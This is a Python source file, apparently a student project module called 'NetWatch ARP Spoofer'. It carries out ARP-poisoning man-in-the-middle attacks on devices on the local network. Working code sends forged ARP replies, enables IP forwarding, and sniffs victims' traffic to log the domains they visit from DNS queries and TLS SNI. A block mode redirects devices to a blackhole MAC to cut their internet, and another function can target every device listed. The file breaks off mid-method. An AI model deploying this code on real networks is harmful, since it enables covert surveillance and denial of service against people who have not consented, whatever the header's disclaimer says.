"""
NetWatch ARP Spoofer — FYP Network Monitoring Module
=====================================================
Performs ARP-based MITM so per-device traffic can be captured and analysed.

REQUIREMENTS
  • Run the server as Administrator
  • Npcap installed (https://npcap.com)
  • Only target devices on your OWN network with consent from all users.
    Intercepting third-party traffic without consent is illegal in most
    jurisdictions.

HOW IT WORKS
  1. ARP spoofing (MONITOR mode):
       • Sends periodic ARP "is-at" replies that tell the TARGET:
         "the gateway's MAC address is MY MAC"
       • Sends the same to the GATEWAY:
         "the target's MAC address is MY MAC"
       Traffic now flows  Target → your PC → Gateway  (and back).
  2. IP forwarding enabled so MONITORED targets keep their internet connection.
  3. BLOCK mode: same ARP spoofing, but the TARGET is told the gateway is at a
       BLACKHOLE MAC (a fake, unused address). Its traffic is sent to a dead
       address and dropped by the switch/AP, cutting its internet — independent
       of IP forwarding, so you can monitor one device and block another at once.
  4. On stop/unblock, correct ARP entries are restored for every spoofed device.
"""

import ipaddress
import re
import socket
import subprocess
import threading
import time
from collections import defaultdict
from typing import Dict, List, Optional, Tuple

# ── optional Windows registry access ──────────────────────────────────────────
try:
    import winreg as _winreg
    _WINREG = True
except ImportError:
    _WINREG = False

# ── Scapy ─────────────────────────────────────────────────────────────────────
try:
    from scapy.all import (
        ARP, DNS, DNSQR, Ether, IP, Raw, TCP, UDP,
        conf as _scapy_conf, get_if_hwaddr, send, sniff, srp,
    )
    _SCAPY = True
except ImportError:
    _SCAPY = False

# ──────────────────────────────────────────────────────────────────────────────
# Per-device traffic tracker
# ──────────────────────────────────────────────────────────────────────────────

class _DeviceTraffic:
    def __init__(self, ip: str):
        self.ip            = ip
        self.packets_in    = 0
        self.packets_out   = 0
        self.bytes_in      = 0
        self.bytes_out     = 0
        self.protocols: Dict[str, int] = defaultdict(int)
        self.remote_ips: Dict[str, int] = defaultdict(int)
        self.domains:    Dict[str, int] = defaultdict(int)
        self.start_time    = time.time()
        self.last_seen     = time.time()

    def to_dict(self) -> dict:
        elapsed = max(time.time() - self.start_time, 1)
        top_ips  = sorted(self.remote_ips.items(), key=lambda x: x[1], reverse=True)[:10]
        top_dom  = sorted(self.domains.items(),    key=lambda x: x[1], reverse=True)[:10]
        return {
            "ip":           self.ip,
            "packets_in":   self.packets_in,
            "packets_out":  self.packets_out,
            "bytes_in":     self.bytes_in,
            "bytes_out":    self.bytes_out,
            "mbps_in":      round(self.bytes_in  * 8 / (elapsed * 1_000_000), 3),
            "mbps_out":     round(self.bytes_out * 8 / (elapsed * 1_000_000), 3),
            "protocols":    dict(self.protocols),
            "top_ips":      dict(top_ips),
            "top_domains":  dict(top_dom),
            "duration_s":   round(elapsed, 1),
        }


# ──────────────────────────────────────────────────────────────────────────────
# Main class
# ──────────────────────────────────────────────────────────────────────────────

class ARPSpoofer:
    # Seconds between refreshing ARP poison packets for each target.
    # 2 s is standard (fast enough that the target's real ARP entry doesn't
    # expire before we refresh, but slow enough not to flood the network).
    SPOOF_INTERVAL = 2.0

    # Seconds to wait between starting each new target when spoofing ALL devices.
    # Staggering avoids overwhelming the gateway with simultaneous ARP replies.
    STAGGER_DELAY = 0.4

    # Don't re-run the (subprocess-backed) network detection more often than
    # this when polled, e.g. by the dashboard's status endpoint.
    _DETECT_TTL = 3.0

    # MAC advertised to a BLOCKED device for the gateway IP. It is a locally-
    # administered, unicast address (the 0x02 bit) that belongs to no real NIC,
    # so the victim's frames to "the gateway" are sent to a dead address and
    # discarded by the switch/AP. This cuts its internet WITHOUT relying on IP
    # forwarding being off — so blocking works even while another device is
    # being monitored (forwarding ON). Nothing here is network-specific.
    BLACKHOLE_MAC = "de:ad:be:ef:de:ad"

    def __init__(self):
        self.gateway_ip:  Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.my_mac:      Optional[str] = None
        self.my_ip:       Optional[str] = None
        self.netmask:     Optional[str] = None   # subnet mask of the active adapter
        self.iface_name:  Optional[str] = None   # Windows adapter name for netsh
        self._last_detect = 0.0                  # timestamp of last endpoint detect

        # ip → {thread, stop_event, target_mac, started_at, mode}
        #   mode == "monitor" → packets ARE forwarded (device stays online, captured)
        #   mode == "block"   → packets are NOT forwarded (device loses internet)
        self._spoofed:  Dict[str, dict]            = {}
        self._traffic:  Dict[str, _DeviceTraffic]  = {}
        self._lock      = threading.Lock()

        self._cap_thread: Optional[threading.Thread] = None
        self._cap_stop    = threading.Event()

        self._orig_forwarding: Optional[int] = None   # registry value before we changed it
        self._forwarding_on   = False                 # whether WE currently have it enabled

        if _SCAPY:
            self._init_network()
        else:
            print("[ARPSpoofer] Scapy not available — spoofing disabled")

    # ── initialisation ─────────────────────────────────────────────────────────

    def _init_network(self):
        """Detect our IP/MAC, the default gateway IP and MAC at startup."""
        self._detect_endpoints(force=True)   # my_ip, netmask, gateway_ip, iface
        self._resolve_macs(force=True)       # gateway_mac, my_mac

    def _detect_endpoints(self, force: bool = False) -> bool:
        """(Re)detect the IP / subnet / gateway / adapter for the network we are
        connected to RIGHT NOW. Cheap (no ARP), so it can be re-run on demand.

        This is what keeps the spoofer working after the machine roams to a
        different network (home Wi-Fi → mobile hotspot, etc.): every value here
        is detected live, nothing is hardcoded or cached from startup.

        Returns True if the gateway IP changed since the previous detection.
        """
        now = time.time()
        if not force and (now - self._last_detect) < self._DETECT_TTL:
            return False
        self._last_detect = now

        prev_gateway = self.gateway_ip

        # 1. Outbound (gateway-facing) IP for the active network.
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(("8.8.8.8", 80))
            self.my_ip = s.getsockname()[0]
            s.close()
        except Exception as exc:
            print(f"[ARPSpoofer] Could not detect local IP: {exc}")
            return False

        # 2. Subnet mask + adapter name of whichever adapter owns my_ip.
        self.netmask, self.iface_name = self._netmask_and_iface_for_ip(self.my_ip)

        # 3. Default gateway from the live routing table.
        gw = self._detect_gateway()
        if not gw:
            # Last-resort: assume .1 on our /24 (still derived from the live IP).
            parts = self.my_ip.split('.')
            gw = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        self.gateway_ip = gw

        changed = (prev_gateway != self.gateway_ip)
        if changed:
            print(f"[ARPSpoofer] Network detected: my_ip={self.my_ip} "
                  f"mask={self.netmask} gateway={self.gateway_ip} "
                  f"adapter={self.iface_name}")
        return changed

    def _resolve_macs(self, force: bool = False):
        """Resolve the gateway MAC (and our own MAC). Re-resolved when the
        gateway changes or a previous resolve failed."""
        if force or not self.gateway_mac:
            if self.gateway_ip:
                self.gateway_mac = self._arp_resolve(self.gateway_ip)
                print(f"[ARPSpoofer] Gateway MAC: {self.gateway_mac}")
        if force or not self.my_mac or self.my_mac == "Unknown":
            try:
                self.my_mac = get_if_hwaddr(_scapy_conf.iface).upper()
            except Exception:
                self.my_mac = "Unknown"
            print(f"[ARPSpoofer] Our MAC: {self.my_mac}")

    def refresh(self) -> bool:
        """Re-detect the current network and make sure the gateway MAC is known.
        Safe (and cheap) to call before every spoof. Returns True if the gateway
        changed."""
        if not _SCAPY:
            return False
        changed = self._detect_endpoints(force=True)
        # Re-resolve the gateway MAC only when the gateway changed (or unknown).
        self._resolve_macs(force=changed)
        return changed

    def _on_my_subnet(self, ip: str) -> bool:
        """True if ip is on the same subnet as our current adapter. Falls back
        to a /24 comparison if the mask is unknown. Generic — derived entirely
        from the live adapter, no hardcoded ranges."""
        if not self.my_ip:
            return False
        try:
            mask = self.netmask or "255.255.255.0"
            net = ipaddress.IPv4Network(f"{self.my_ip}/{mask}", strict=False)
            return ipaddress.IPv4Address(ip) in net
        except Exception:
            return ip.rsplit(".", 1)[0] == self.my_ip.rsplit(".", 1)[0]

    def _detect_gateway(self) -> Optional[str]:
        """Parse 'route print 0.0.0.0' for the default IPv4 gateway."""
        try:
            r = subprocess.run(
                ["route", "print", "0.0.0.0"],
                capture_output=True, text=True, timeout=5
            )
            for line in r.stdout.splitlines():
                stripped = line.strip()
                # Line looks like: "0.0.0.0  0.0.0.0  192.168.1.1  192.168.1.29  35"
                if stripped.startswith("0.0.0.0") and "0.0.0.0" in stripped:
                    parts = stripped.split()
                    if len(parts) >= 3:
                        candidate = parts[2]
                        if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', candidate):
                            return candidate
        except Exception:
            pass
        return None

    def _netmask_and_iface_for_ip(self, target_ip: str) -> Tuple[Optional[str], Optional[str]]:
        """Return (netmask, adapter_name) for the adapter that owns target_ip."""
        try:
            import psutil
            for name, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET and addr.address == target_ip:
                        return addr.netmask, name
        except Exception:
            pass
        return None, None

    def _arp_resolve(self, ip: str, timeout: int = 3) -> Optional[str]:
        """Resolve an IP → MAC. Tries an active scapy ARP request first; if that
        fails (wrong default interface, timing, driver quirk) it falls back to
        the OS ARP cache. Returns a normalised AA:BB:CC:DD:EE:FF string or None.
        """
        # 1. Active ARP request via scapy.
        try:
            answered, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=timeout, verbose=0, retry=2
            )
            if answered:
                return answered[0][1].hwsrc.upper()
        except Exception as exc:
            print(f"[ARPSpoofer] scapy ARP resolve failed for {ip}: {exc}")

        # 2. Fallback: the OS ARP cache (populated by the device scan / normal
        #    traffic). A single ping first nudges the OS to (re)resolve it.
        mac = self._arp_cache_lookup(ip)
        if mac:
            print(f"[ARPSpoofer] Resolved {ip} → {mac} from OS ARP cache")
        return mac

    def _arp_cache_lookup(self, ip: str) -> Optional[str]:
        """Look an IP up in the Windows ARP table ('arp -a'). Returns the MAC as
        AA:BB:CC:DD:EE:FF, or None if there's no valid entry."""
        try:
            subprocess.run(["ping", "-n", "1", "-w", "500", ip],
                           capture_output=True, timeout=3)
        except Exception:
            pass
        try:
            out = subprocess.run(["arp", "-a", ip], capture_output=True,
                                 text=True, timeout=5).stdout
        except Exception:
            return None
        # Rows look like:  192.168.1.5   aa-bb-cc-dd-ee-ff   dynamic
        m = re.search(
            rf"{re.escape(ip)}\s+([0-9A-Fa-f]{{2}}(?:[-:][0-9A-Fa-f]{{2}}){{5}})",
            out
        )
        if not m:
            return None
        mac = m.group(1).replace("-", ":").upper()
        if mac in ("00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF"):
            return None   # incomplete / broadcast entry
        return mac

    # ── IP forwarding (Windows) ────────────────────────────────────────────────

    def _read_forwarding_registry(self) -> int:
        if not _WINREG:
            return 0
        try:
            key = _winreg.OpenKey(
                _winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                0, _winreg.KEY_READ
            )
            val, _ = _winreg.QueryValueEx(key, "IPEnableRouter")
            _winreg.CloseKey(key)
            return int(val)
        except FileNotFoundError:
            return 0
        except Exception as exc:
            print(f"[ARPSpoofer] Registry read error: {exc}")
            return 0

    def _write_forwarding_registry(self, value: int):
        if not _WINREG:
            return
        try:
            key = _winreg.OpenKey(
                _winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                0, _winreg.KEY_SET_VALUE
            )
            _winreg.SetValueEx(key, "IPEnableRouter", 0, _winreg.REG_DWORD, value)
            _winreg.CloseKey(key)
            print(f"[ARPSpoofer] Registry IPEnableRouter = {value}")
        except Exception as exc:
            print(f"[ARPSpoofer] Registry write error: {exc}")

    def _netsh_forwarding(self, enable: bool):
        """Set per-interface forwarding via netsh (takes effect immediately)."""
        if not self.iface_name:
            return
        state = "enabled" if enable else "disabled"
        try:
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "interface",
                 self.iface_name, f"forwarding={state}"],
                capture_output=True, timeout=5
            )
            print(f"[ARPSpoofer] netsh forwarding={state} on '{self.iface_name}'")
        except Exception as exc:
            print(f"[ARPSpoofer] netsh error: {exc}")

    def _enable_ip_forwarding(self):
        """Save current state (once), then enable IP forwarding via registry + netsh."""
        if self._orig_forwarding is None:          # remember the user's real setting once
            self._orig_forwarding = self._read_forwarding_registry()
        self._write_forwarding_registry(1)
        self._netsh_forwarding(True)
        print("[ARPSpoofer] IP forwarding ENABLED — monitored targets keep internet")

    def _restore_ip_forwarding(self):
        """Return IP forwarding to whatever it was before we started."""
        if self._orig_forwarding is None:
            return
        self._write_forwarding_registry(self._orig_forwarding)
        self._netsh_forwarding(bool(self._orig_forwarding))
        print(f"[ARPSpoofer] IP forwarding restored to original ({self._orig_forwarding})")
        self._orig_forwarding = None               # re-read fresh next cycle

    def _apply_policies(self):
        """Enable IP forwarding + packet capture iff at least one MONITORED
        device is active; otherwise disable them.

        Forwarding is ONLY about monitoring now:
          • Monitor → needs forwarding ON so the device's packets (which come to
                      our real MAC) are relayed to the gateway and it stays online.
          • Block   → does NOT touch forwarding. A blocked device is poisoned with
                      a BLACKHOLE MAC (see _spoof_loop), so its traffic is sent to a
                      dead address and dropped by the switch/AP whether forwarding
                      is ON or OFF. That makes Block and Monitor fully independent:
                      you can monitor one device and block another at the same time.
        """
        with self._lock:
            monitors = any(i.get("mode") == "monitor" for i in self._spoofed.values())

        if monitors and not self._forwarding_on:
            self._enable_ip_forwarding()
            self._start_capture()
            self._forwarding_on = True
        elif not monitors and self._forwarding_on:
            self._stop_capture()
            self._restore_ip_forwarding()
            self._forwarding_on = False

    # ── low-level ARP packet helpers ───────────────────────────────────────────

    def _send_spoof(self, target_ip: str, target_mac: str, claim_ip: str,
                    claim_mac: Optional[str] = None):
        """Tell target_ip: 'claim_ip is at <claim_mac>'.

        claim_mac defaults to OUR MAC (monitor → traffic comes to us and is
        forwarded). For a BLOCK we pass BLACKHOLE_MAC, so the victim sends its
        gateway-bound traffic to a dead address and loses internet regardless of
        our IP-forwarding state."""
        try:
            pkt = ARP(
                op=2,              # ARP reply (is-at)
                pdst=target_ip,
                hwdst=target_mac,
                psrc=claim_ip,     # IP we are impersonating
                hwsrc=claim_mac or self.my_mac,
            )
            send(pkt, verbose=0)
        except Exception as exc:
            print(f"[ARPSpoofer] Spoof send error: {exc}")

    def _send_restore(self, target_ip: str, target_mac: str,
                      real_ip: str, real_mac: str, count: int = 6):
        """Send correct ARP replies to undo the poisoning."""
        try:
            pkt = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=real_ip,
                hwsrc=real_mac,
            )
            send(pkt, count=count, verbose=0)
        except Exception as exc:
            print(f"[ARPSpoofer] Restore send error: {exc}")

    # ── per-target spoof loop ──────────────────────────────────────────────────

    def _spoof_loop(self, target_ip: str, target_mac: str,
                    stop_event: threading.Event):
        """Run in a daemon thread — sends two ARP spoofs every SPOOF_INTERVAL s:
        • to target  : "the gateway is at <claim_mac>"
        • to gateway : "target is at <claim_mac>"

        The advertised MAC depends on this target's current mode (read live each
        cycle, so a monitor↔block switch takes effect without restarting):
          • monitor → OUR MAC      → traffic flows through us (forwarded → online)
          • block   → BLACKHOLE MAC → traffic goes to a dead address → internet cut

        Cleans up with restore packets (the REAL MACs) when stop_event is set,
        so either mode comes back online cleanly.
        """
        with self._lock:
            info = self._spoofed.get(target_ip)
            start_mode = info.get("mode", "monitor") if info else "monitor"
        verb = "Blocking" if start_mode == "block" else "Spoofing"
        print(f"[ARPSpoofer] ▶ {verb} {target_ip}  (MAC {target_mac})  "
              f"via gateway {self.gateway_ip}")

        while not stop_event.is_set():
            # Re-read mode each cycle so switching monitor↔block is live.
            with self._lock:
                info = self._spoofed.get(target_ip)
                mode = info.get("mode", "monitor") if info else "monitor"
            claim_mac = self.BLACKHOLE_MAC if mode == "block" else self.my_mac

            self._send_spoof(target_ip,       target_mac,       self.gateway_ip, claim_mac)
            self._send_spoof(self.gateway_ip, self.gateway_mac, target_ip,       claim_mac)
            stop_event.wait(self.SPOOF_INTERVAL)

        # ── restore phase (always re-advertise the REAL MACs) ──────────────
        print(f"[ARPSpoofer] ■ Restoring ARP for {target_ip} ...")
        self._send_restore(target_ip,      target_mac,
                           self.gateway_ip, self.gateway_mac)
        self._send_restore(self.gateway_ip, self.gateway_mac,
                           target_ip,       target_mac)
        print(f"[ARPSpoofer] ✓ ARP restored for {target_ip}")

    # ── hostname extraction helpers ─────────────────────────────────────────────

    @staticmethod
    def _is_real_domain(domain: str) -> bool:
        """Filter out mDNS/link-local/service-discovery noise so only real
        public website hostnames are recorded.

        Rejected:
          • *.local / *.arpa  (mDNS, reverse-DNS)
          • service-discovery names like _googlecast._tcp, _airplay._tcp
          • names with no dot, or 'localhost'
        Accepted:
          • youtube.com, www.instagram.com, i.ytimg.com, etc.
        """
        if not domain:
            return False
        d = domain.strip().lower().rstrip(".")
        if not d or d == "localhost":
            return False
        if d.endswith(".local") or d.endswith(".arpa") or d.endswith(".home"):
            return False
        if d.startswith("_") or "._" in d:        # _googlecast._tcp.local etc.
            return False
        if "." not in d:                          # single-label name = not a website
            return False
        # Reject pure-IP "hostnames" (reverse lookups) and anything with spaces
        if " " in d:
            return False
        return True

    @staticmethod
    def _extract_sni(payload: bytes) -> Optional[str]:
        """Parse the Server Name Indication (SNI) hostname out of a TLS
        ClientHello. The SNI is sent in cleartext at the start of every HTTPS
        connection, so it reveals the real hostname (e.g. 'www.youtube.com')
        even though the rest of the TLS session is encrypted.

        Returns the hostname string, or None if this packet is not a
        ClientHello / has no SNI / is malformed.

        TLS structure walked here:
          TLS record   : type(1)=0x16  version(2)  length(2)
          Handshake    : type(1)=0x01(ClientHello)  length(3)
          ClientHello  : version(2) random(32)
                         session_id(1+n)
                         cipher_suites(2+n)
                         compression(1+n)
                         extensions(2+n)
          Extension    : type(2) length(2) data
            SNI ext (type 0x0000):
                         list_len(2) name_type(1)=0x00 name_len(2) hostname(n)
        """
        try:
            n = len(payload)
            if n < 5 or payload[0] != 0x16:        # 0x16 = TLS handshake record
                return None
            pos = 5                                # skip 5-byte TLS record header
            if pos + 4 > n or payload[pos] != 0x01:  # 0x01 = ClientHello
                return None
            pos += 4                               # skip handshake type(1)+length(3)
            pos += 2 + 32                          # skip client version(2)+random(32)
            if pos >= n:
                return None
            # session id
            sid_len = payload[pos]; pos += 1 + sid_len
            if pos + 2 > n:
                return None
            # cipher suites
            cs_len = int.from_bytes(payload[pos:pos + 2], "big"); pos += 2 + cs_len
            if pos + 1 > n:
                return None
            # compression methods
            cm_len = payload[pos]; pos += 1 + cm_len
            if pos + 2 > n:
                return None
            # extensions block
            ext_total = int.from_bytes(payload[pos:pos + 2], "big"); pos += 2
            end = min(pos + ext_total, n)
            while pos + 4 <= end:
                ext_type = int.from_bytes(payload[pos:pos + 2], "big")
                ext_len  = int.from_bytes(payload[pos + 2:pos + 4], "big")
                pos += 4
                if ext_type == 0x0000:             # server_name extension
                    # server_name_list_length(2) name_type(1) name_len(2) name
                    if pos + 5 > n:
                        return None
                    name_type = payload[pos + 2]
                    name_len  = int.from_bytes(payload[pos + 3:pos + 5], "big")
                    start = pos + 5
                    if name_type == 0x00 and start + name_len <= n:
                        return payload[start:start + name_len].decode("utf-8", "ignore")
                    return None
                pos += ext_len
        except Exception:
            return None
        return None

    # ── packet capture ─────────────────────────────────────────────────────────

    def _process_packet(self, pkt):
        """sniff() callback — update per-device stats for monitored IPs only."""
        if not pkt.haslayer(IP):
            return

        src  = pkt[IP].src
        dst  = pkt[IP].dst
        size = len(pkt)

        with self._lock:
            # Only MONITORED devices get traffic stats — blocked devices are
            # being cut, not observed, so they never appear in the traffic panel.
            monitored = {ip for ip, i in self._spoofed.items()
                         if i.get("mode") == "monitor"}

        # Determine if src or dst is a monitored device
        if src in monitored:
            target_ip, direction, remote_ip = src, "out", dst
        elif dst in monitored:
            target_ip, direction, remote_ip = dst, "in", src
        else:
            return

        # Don't count our own PC's traffic
        if src == self.my_ip or dst == self.my_ip:
            return

        with self._lock:
            if target_ip not in self._traffic:
                self._traffic[target_ip] = _DeviceTraffic(target_ip)
            stats = self._traffic[target_ip]

        stats.last_seen = time.time()
        if direction == "out":
            stats.packets_out += 1
            stats.bytes_out   += size
        else:
            stats.packets_in  += 1
            stats.bytes_in    += size

        # ── protocol classification ────────────────────────────────────────
        tcp_port = udp_port = None
        if pkt.haslayer(TCP):
            tcp_port = pkt[TCP].dport if direction == "out" else pkt[TCP].sport
            if   tcp_port == 443: stats.protocols["HTTPS"] += 1
            elif tcp_port == 80:  stats.protocols["HTTP"]  += 1
            elif tcp_port == 22:  stats.protocols["SSH"]   += 1
            elif tcp_port == 21:  stats.protocols["FTP"]   += 1
            else:                 stats.protocols["TCP"]   += 1
        elif pkt.haslayer(UDP):
            udp_port = pkt[UDP].dport if direction == "out" else pkt[UDP].sport
            if   udp_port == 53:   stats.protocols["DNS"] += 1
            elif udp_port == 5353: stats.protocols["mDNS"] += 1
            elif udp_port == 123:  stats.protocols["NTP"] += 1
            elif udp_port == 443:  stats.protocols["QUIC"] += 1   # HTTP/3
            else:                  stats.protocols["UDP"] += 1

        # ── remote IPs (external only) ─────────────────────────────────────
        private = ('192.168.', '10.', '172.16.', '172.17.', '172.18.',
                   '172.19.', '172.20.', '172.21.', '172.22.', '172.23.',
                   '172.24.', '172.25.', '172.26.', '172.27.', '172.28.',
                   '172.29.', '172.30.', '172.31.', '127.', '224.', '239.',
                   '255.')
        if not any(remote_ip.startswith(p) for p in private):
            stats.remote_ips[remote_ip] += 1

        # ── DOMAIN EXTRACTION — source 1: DNS queries ──────────────────────
        # Real unicast DNS only (port 53). mDNS (5353) is multicast service
        # discovery noise (e.g. _googlecast._tcp.local) and is skipped.
        if udp_port == 53 and pkt.haslayer(DNSQR):
            try:
                # qr==0 → this is a query (the device asking "what is X?"),
                # not a response. Record the queried hostname.
                if getattr(pkt[DNS], "qr", 0) == 0:
                    domain = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
                    if self._is_real_domain(domain):
                        stats.domains[domain] += 1
                        print(f"[ARPSpoofer] [DNS]  {target_ip} → {domain}")
            except Exception:
                pass

        # ── DOMAIN EXTRACTION — source 2: TLS SNI (HTTPS port 443) ─────────
        # The ClientHello at the start of every HTTPS connection carries the
        # hostname in cleartext, so we get the real site even though the rest
        # of the session is encrypted.
        if tcp_port == 443 and pkt.haslayer(Raw):
            try:
                sni = self._extract_sni(bytes(pkt[Raw].load))
                if sni and self._is_real_domain(sni):
                    stats.domains[sni] += 1
                    print(f"[ARPSpoofer] [SNI]  {target_ip} → {sni}")
            except Exception:
                pass

    def _capture_thread_fn(self):
        """sniff in 2-second bursts so _cap_stop.is_set() is checked regularly."""
        print("[ARPSpoofer] Packet capture started")
        while not self._cap_stop.is_set():
            try:
                sniff(filter="ip", prn=self._process_packet, store=0, timeout=2)
            except Exception as exc:
                if not self._cap_stop.is_set():
                    print(f"[ARPSpoofer] Capture error: {exc}")
                    time.sleep(1)
        print("[ARPSpoofer] Packet capture stopped")

    def _start_capture(self):
        # Clear the stop flag FIRST: if a previous capture thread is still
        # winding down (within its 2 s sniff burst) when we re-enable, clearing
        # the flag lets it keep running rather than exiting and leaving us with
        # no capture at all.
        self._cap_stop.clear()
        if self._cap_thread and self._cap_thread.is_alive():
            return
        self._cap_thread = threading.Thread(
            target=self._capture_thread_fn, daemon=True, name="arp-capture"
        )
        self._cap_thread.start()

    def _stop_capture(self):
        self._cap_stop.set()

    # ── public API ─────────────────────────────────────────────────────────────

    def start_spoof(self, target_ip: str, mode: str = "monitor") -> dict:
        """Begin ARP spoofing a single target. Safe to call multiple times.

        mode == "monitor" → forward the device's packets (it stays online; we
                            capture its traffic).
        mode == "block"   → do NOT forward (its redirected packets die here, so
                            the device loses internet).

        The ARP poisoning itself is identical for both modes — only whether we
        forward the captured packets differs (see _apply_policies)."""
        mode   = "block" if mode == "block" else "monitor"
        action = "block" if mode == "block" else "monitor"

        if not _SCAPY:
            return {"ok": False,
                    "error": "Scapy/Npcap not available on the server — install Npcap "
                             "and the scapy package, then run as Administrator."}

        # Re-detect the CURRENT network first, so this works on whatever network
        # the machine is on right now (home Wi-Fi, hotspot, …) and survives the
        # user roaming between networks after the server started.
        self.refresh()

        if not self.gateway_ip or not self.gateway_mac:
            return {"ok": False, "gateway_ip": self.gateway_ip,
                    "error": "No gateway detected on the current network — "
                             "is Wi-Fi / hotspot connected?"}

        # ── EDGE CASE: target IS the gateway / hotspot host ──────────────────
        # You can't ARP-MITM the router itself — it already carries the whole
        # network's traffic, so there's nothing to redirect. Detected against
        # the gateway we just detected live, so it's correct on any network.
        if target_ip == self.gateway_ip:
            return {"ok": False, "is_gateway": True, "gateway_ip": self.gateway_ip,
                    "error": f"Cannot {action} the gateway/hotspot host ({self.gateway_ip}). "
                             f"It routes the whole network's traffic and can't be MITM-ed — "
                             f"choose a client device instead."}

        if target_ip == self.my_ip:
            return {"ok": False,
                    "error": f"Cannot {action} this PC itself ({self.my_ip})."}

        # ── Target must be on the network we're connected to right now ───────
        if not self._on_my_subnet(target_ip):
            return {"ok": False,
                    "error": f"{target_ip} is not on the current network "
                             f"({self.my_ip}/{self.netmask or '255.255.255.0'}). "
                             f"It may be left over from a previous network — rescan devices."}

        # Already spoofing this IP? If the mode matches, it's a no-op; if not,
        # just switch modes — the poisoning is identical, only forwarding differs.
        with self._lock:
            existing = self._spoofed.get(target_ip)
            if existing is not None:
                if existing.get("mode") == mode:
                    return {"ok": True, "already": True, "mode": mode,
                            "target_ip": target_ip,
                            "message": f"{target_ip} is already in {mode} mode"}
                existing["mode"] = mode
                if mode == "monitor":
                    self._traffic.setdefault(target_ip, _DeviceTraffic(target_ip))
                else:                       # → block: drop any monitor traffic card
                    self._traffic.pop(target_ip, None)
                switched = True
            else:
                switched = False

        if switched:
            self._apply_policies()
            print(f"[ARPSpoofer] {target_ip} switched to {mode} mode")
            return {"ok": True, "switched": True, "mode": mode,
                    "target_ip": target_ip, "gateway_ip": self.gateway_ip,
                    "message": f"{target_ip} switched to {mode} mode"}

        # Resolve target's real MAC before we start poisoning
        target_mac = self._arp_resolve(target_ip)
        if not target_mac:
            return {"ok": False,
                    "error": f"Could not resolve the MAC address of {target_ip} — "
                             f"the device may be offline or unreachable. Try rescanning."}

        # Launch per-target spoof thread (same poisoning for monitor and block)
        stop_event = threading.Event()
        t = threading.Thread(
            target=self._spoof_loop,
            args=(target_ip, target_mac, stop_event),
            daemon=True, name=f"{mode}-{target_ip}"
        )

        with self._lock:
            self._spoofed[target_ip] = {
                "thread":     t,
                "stop_event": stop_event,
                "target_mac": target_mac,
                "started_at": time.time(),
                "mode":       mode,
            }
            if mode == "monitor":
                self._traffic[target_ip] = _DeviceTraffic(target_ip)

        # Set forwarding/capture for the monitored set (block is independent of
        # forwarding), THEN start the poison thread.
        self._apply_policies()
        t.start()

        verb = "Blocking" if mode == "block" else "Monitoring"
        print(f"[ARPSpoofer] {verb} started for {target_ip} (MAC {target_mac})")
        msg = (f"Blocking {target_ip} — its gateway is blackholed, internet cut."
               if mode == "block" else
               f"Monitoring {target_ip} — traffic via this PC (internet stays up).")
        return {
            "ok":          True,
            "mode":        mode,
            "target_ip":   target_ip,
            "target_mac":  target_mac,
            "gateway_ip":  self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "message":     msg,
        }

    # ── block / unblock = ARP spoof to a blackhole MAC ──────────────────────────

    def block_device(self, target_ip: str) -> dict:
        """Cut a device's internet: ARP-spoof its gateway entry to a blackhole
        MAC so its traffic goes nowhere (works regardless of IP forwarding)."""
        return self.start_spoof(target_ip, mode="block")

    def unblock_device(self, target_ip: str) -> dict:
        """Restore a blocked device's internet (clean ARP restore)."""
        return self.stop_spoof(target_ip, expect_mode="block")

    def stop_spoof(self, target_ip: str, expect_mode: Optional[str] = None) -> dict:
        """Stop spoofing one target (monitor OR block) and restore its ARP
        entries. If expect_mode is given, only stop when the target is in that
        mode (so 'Unblock' won't accidentally stop a monitor, and vice-versa)."""
        with self._lock:
            info = self._spoofed.get(target_ip)
            if info is None:
                return {"ok": False,
                        "error": f"{target_ip} is not being monitored or blocked"}
            if expect_mode and info.get("mode") != expect_mode:
                return {"ok": False,
                        "error": f"{target_ip} is in {info.get('mode')} mode, "
                                 f"not {expect_mode}."}
            mode = info.get("mode", "monitor")
            self._spoofed.pop(target_ip, None)
            self._traffic.pop(target_ip, None)

        info["stop_event"].set()
        info["thread"].join(timeout=10)   # wait for the restore packets to send

        # Re-evaluate forwarding/capture for whatever's left.
        self._apply_policies()

        verb = "Block" if mode == "block" else "Monitoring"
        print(f"[ARPSpoofer] {verb} stopped for {target_ip} — ARP restored")
        return {"ok": True, "mode": mode, "target_ip": target_ip,
                "message": (f"Unblocked {target_ip} — internet restored."
                            if mode == "block" else
                            f"Stopped monitoring {target_ip} — ARP restored.")}

    def start_all(self, target_ips: List[str], mode: str = "monitor") -> dict:
        """Spoof multiple targets, staggered by STAGGER_DELAY to avoid gateway floods."""
        results: dict = {}
        started = 0
        for ip in target_ips:
            if ip in (self.gateway_ip, self.my_ip):
                results[ip] = "skipped (gateway or self)"
                continue
            if started > 0:
                time.sleep(self.STAGGER_DELAY)
            r = self.start_spoof(ip, mode=mode)
            results[ip] = "ok" if r.get("ok") else r.get("error", "failed")
            started += 1
        return results

    def stop_all(self, mode: Optional[str] = None) -> dict:
        """Restore ARP for every spoofed device immediately. If mode is given,
        only stop devices in that mode (e.g. mode='block' for 'Unblock ALL');
        otherwise stop everything (emergency Stop ALL / server shutdown)."""
        with self._lock:
            targets = [ip for ip, i in self._spoofed.items()
                       if mode is None or i.get("mode") == mode]
        results: dict = {}
        for ip in targets:
            r = self.stop_spoof(ip)
            results[ip] = "restored" if r.get("ok") else r.get("error", "failed")
        return results

    def unblock_all(self) -> dict:
        """Restore internet for every currently-blocked device."""
        return self.stop_all(mode="block")

    # ── status & stats ─────────────────────────────────────────────────────────

    def _split_by_mode(self) -> Tuple[List[str], List[str]]:
